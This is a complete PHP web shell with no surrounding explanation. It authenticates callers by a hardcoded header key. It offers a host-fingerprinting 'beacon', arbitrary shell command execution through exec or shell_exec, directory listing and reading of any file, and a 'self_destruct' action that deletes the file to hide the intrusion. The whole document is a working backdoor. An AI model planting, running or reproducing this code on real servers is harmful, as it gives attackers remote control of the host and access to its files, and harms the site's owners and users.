<?php
@ini_set('display_errors',0);@set_time_limit(0);
header('Content-Type: application/json');
$k='sentinelx_2024';
if(!isset($_SERVER['HTTP_X_AUTH'])||$_SERVER['HTTP_X_AUTH']!==$k){echo json_encode(['status'=>'error','message'=>'auth']);exit;}
$a=$_POST['action']??'beacon';
if($a==='beacon'){echo json_encode(['status'=>'ok','data'=>['hostname'=>gethostname(),'os'=>php_uname('s').' '.php_uname('r'),'php'=>phpversion(),'user'=>function_exists('get_current_user')?get_current_user():'?','cwd'=>getcwd()]]);exit;}
if($a==='exec'){$c=$_POST['cmd']??'';$o='';
if(function_exists('exec')){exec($c,$l);$o=implode("
",$l);}elseif(function_exists('shell_exec'))$o=shell_exec($c)??'';
echo json_encode(['status'=>'ok','output'=>$o,'cwd'=>getcwd()]);exit;}
if($a==='file'){$p=$_POST['path']??getcwd();$f=$_POST['faction']??'list';
if($f==='list'){$i=array_diff(scandir($p),['.','..']);$l=[];
foreach($i as$e){$fp="$p/$e";$l[]=['name'=>$e,'type'=>is_dir($fp)?'dir':'file','size'=>is_file($fp)?filesize($fp):0];}
echo json_encode(['status'=>'ok','items'=>$l,'path'=>realpath($p)]);exit;}
if($f==='read'){echo json_encode(['status'=>'ok','content'=>is_file($p)?file_get_contents($p):'']);exit;}}
if($a==='self_destruct'){@unlink(__FILE__);echo json_encode(['status'=>'ok']);exit;}